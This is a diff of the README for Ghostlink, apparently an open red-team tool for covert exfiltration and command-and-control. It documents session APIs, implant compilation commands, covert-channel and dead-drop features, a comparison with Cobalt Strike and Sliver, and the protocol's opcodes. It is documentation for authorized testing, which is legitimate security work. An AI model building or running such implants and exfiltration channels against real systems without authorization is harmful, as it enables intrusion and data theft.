+| `POST` | `/api/sessions/{id}/module` | Execute module (`{"module": "sysinfo", "args": []}`) |
+| `DELETE`| `/api/sessions/{id}` | Gracefully terminate target session |
+| `GET` | `/api/modules` | List all available post-exploitation modules |
 
-## DNS Reconnaissance
+### 2. Wireshark Protocol Dissector (`tools/ghostlink.lua`)
+Debug and analyze Ghostlink protocol frames in Wireshark:
 
 ```bash
-./ghostlink-client -dns-recon
-```
+# Copy dissector to local Wireshark plugins directory:
+mkdir -p ~/.local/lib/wireshark/plugins/
+cp tools/ghostlink.lua ~/.local/lib/wireshark/plugins/
 
-Probes resolver availability, record type support, and recommends the optimal channel.
-
----
-
-## Comparison
-
-| | Ghostlink | Sliver | dnscat2 | Cloak |
-|---|---|---|---|---|
-| **Purpose** | OOB exfil + C2 | Full C2 platform | DNS tunnel | C2 |
-| Covert channels | **9** | 3-4 | 1 | 1 |
-| DNS-over-HTTPS | Yes | — | — | — |
-| TCP ISN / IP ID stego | **Yes** | — | — | — |
-| Timing / Pkt-size | **Yes** | — | — | — |
-| Dead drops (Discord/S3) | **Yes** | — | — | — |
-| SQLi OOB generator | **Yes** | — | — | — |
-| Multi-path + FEC | **Yes** | — | — | — |
-| Forward Error Correction | **Yes** | — | — | — |
-| Canary / tripwire | **Yes** | — | — | — |
-| Proof of Exfil (SHA-256) | **Yes** | — | — | — |
-| SOCKS5 proxy | Yes | Yes | — | — |
-| Multi-session C2 | Yes | Yes | — | — |
-| Beacon jitter profiles | 5 profiles | Built-in | — | — |
-| Domain fronting | Yes | Yes | — | Yes |
-| C implant | Yes | — | — | — |
-
----
-
-## Protocol
-
-Ghostlink v1.0 uses protocol version 2:
-
-```
-v2 message format (8 bytes header):
-  [version:1][type:1][stream_id:4][payload_len:2][payload:N]
-
-Message types (v1.0):
-  Shell: Stdin(0x01), Stdout(0x02), Stderr(0x03)
-  Cmd:   Req(0x04), Res(0x05)
-  File:  Put(0x06), GetReq(0x07), GetChunk(0x08)
-  Fwd:   Connect(0x10), Data(0x11), Close(0x12)
-  Socks: Connect(0x13), Data(0x14), Close(0x15)
-  Ping:  Ping(0x20), Pong(0x21)
-  Session: Reconnect(0x30), ID(0x31)
-  Module: List(0x40), Exec(0x41), Result(0x42)
-  Exfil: File(0x50), Glob(0x51), Ack(0x52), Chunk(0x53)
-  DeadDrop: Send(0x54), Ack(0x55)
-  Canary: Alert(0x60), Check(0x61)
-  Error: Error(0xFF)
+# In Wireshark: Analyze -> Decode As -> Select Port -> GHOSTLINK
 ```
 
 ---
 
-## Disclaimer
+## 🪶 Ultra-Lightweight C Implant (`ghostimpl`)
 
-This tool is for **authorized red team assessments, penetration testing, and security research only**. Unauthorized use on networks you do not own or have explicit permission to test is illegal.
+For embedded Linux devices, constrained IoT targets, or legacy environments where the Go runtime cannot be deployed, Ghostlink includes `implant/ghostimpl.c`:
 
-## License
+- **Binary Size:** ~30KB statically compiled.
+- **Dependencies:** Zero external libraries (`libc` only; `ws2_32.lib` on Windows).
+- **Transports:** DNS query tunneling + HTTP cookie smuggling.
+- **Compilation:**
+  ```bash
+  # Linux:
+  gcc -Os -s -o ghostimpl implant/ghostimpl.c
 
-MIT — see [LICENSE](LICENSE)
+  # Windows cross-compilation:
+  x86_64-w64-mingw32-gcc -Os -s -o ghostimpl.exe implant/ghostimpl.c -lws2_32
+  ```
 
 ---
 
-[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-sevbandonmez-FFDD00?style=flat&logo=buymeacoffee&logoColor=black)](https://www.buymeacoffee.com/sevbandonmez)
+## ⚔️ Comparison
+
+| Capability | **Ghostlink** | Cobalt Strike | Sliver | dnscat2 | Cloak | Chisel |
+|:---|:---:|:---:|:---:|:---:|:---:|:---:|
+| **Primary Focus** | **Covert OOB Exfil + C2** | Full Enterprise C2 | Open-Source C2 | DNS Tunnel | Covert C2 | TCP/UDP Tunnel |
+| **Covert Channels** | **9 Engines** | 2 (HTTP/DNS) | 3 (HTTP/DNS/WG) | 1 (DNS) | 1 (DNS) | 1 (HTTP/WS) |
+| **DNS-over-HTTPS (DoH)** | **Native (RFC 8484)** | Third-party malleable | Custom | No | No | No |
+| **Steganography (ISN / IP-ID)** | **Yes** | No | No | No | No | No |
+| **Side-Channels (Timing / Size)** | **Yes** | No | No | No | No | No |
+| **Forward Error Correction** | **Yes (XOR Parity)** | No | No | No | No | No |
+| **Multi-Path Striping** | **Yes** | No | No | No | No | No |
+| **Serverless Dead Drops** | **Yes (Discord/S3/Pastebin)** | No | No | No | No | No |
+| **SQLi OOB Generator & Bridge** | **Yes (MySQL/MSSQL/PG/Oracle)** | No | No | No | No | No |
+| **SOCKS5 Dynamic Proxying** | **Yes** | Yes | Yes | No | No | Yes |
+| **Tripwire / Canary Hibernation**| **Yes** | No | No | No | No | No |
+| **Lightweight C Implant** | **Yes (~30KB)** | Artifact Kit | No | Yes | No | No |
+| **Wireshark Dissector** | **Included (`.lua`)** | Third-party | No | Third-party | No | No |
+
+---
+
+## 📐 Wire Protocol v2 Specification
+
+Ghostlink v2 implements an 8-byte binary framing layer designed for low overhead and stream multiplexing:
+
+```text
+ 0                   1                   2                   3
+ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|    Version    |  Message Type |          Stream ID            |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|       Stream ID (cont.)       |         Payload Length        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                         Payload Bytes                         |
+|                             ...                               |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+```
+
+### OpCode Definitions
+
+```text
+Shell Subsystem : Stdin (0x01) · Stdout (0x02) · Stderr (0x03)
+Command Exec    : Req (0x04) · Res (0x05)
+File Transfer   : Put (0x06) · GetReq (0x07) · GetChunk (0x08)
+Port Forwarding : Connect (0x10) · Data (0x11) · Close (0x12)
+SOCKS5 Tunnel   : Connect (0x13) · Data (0x14) · Close (0x15)
+Liveness Heart  : Ping (0x20) · Pong (0x21)
+Session Control : Reconnect (0x30) · SessionID (0x31)
+Post-Exploit    : List (0x40) · Exec (0x41) · Result (0x42)
+Exfiltration    : File (0x50) · Glob (0x51) · Ack (0x52) · Chunk (0x53)
+Dead Drop       : Send (0x54) · Ack (0x55)
+Tripwire / State: Alert (0x60) · Check (0x61)
+Exception       : Error (0xFF)
+```
+
+---
+
+## 🔐 Cryptographic Identity & Author
+
+Ghostlink is researched and developed for authorized red team simulation, defensive gap analysis, and network forensics verification.
+
+```text
+Author          : Sevban Dönmez (@jankesec)
+Role            : Senior Cyber Security Consultant · Red Team & Offensive Security Researcher
+Research Portal : https://jankesec.com
+GitHub          : https://github.com/jankesec
+PGP Fingerprint : FF0A 7D83 6751 CCE3 F9CC F574 FCF8 39FB 7F00 4626
+GPG Key ID      : 5FDB257F4AAE8C3F
+```
+
+---
+
+## ⚠️ Disclaimer
+
+This tool is designed and released **strictly for authorized penetration testing, adversary emulation, and security research**. Unauthorized testing on networks, hosts, or systems without prior written authorization is illegal. The author assumes no liability for misuse, damages, or regulatory violations resulting from this software.
+
+## 📜 License
+
+Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for complete terms.
+
+<p align="center">
+  <a href="https://www.buymeacoffee.com/sevbandonmez">
+    <img src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-sevbandonmez-FFDD00?style=for-the-badge&logo=buymeacoffee&logoColor=black" alt="Buy Me A Coffee">
+  </a>
+</p>
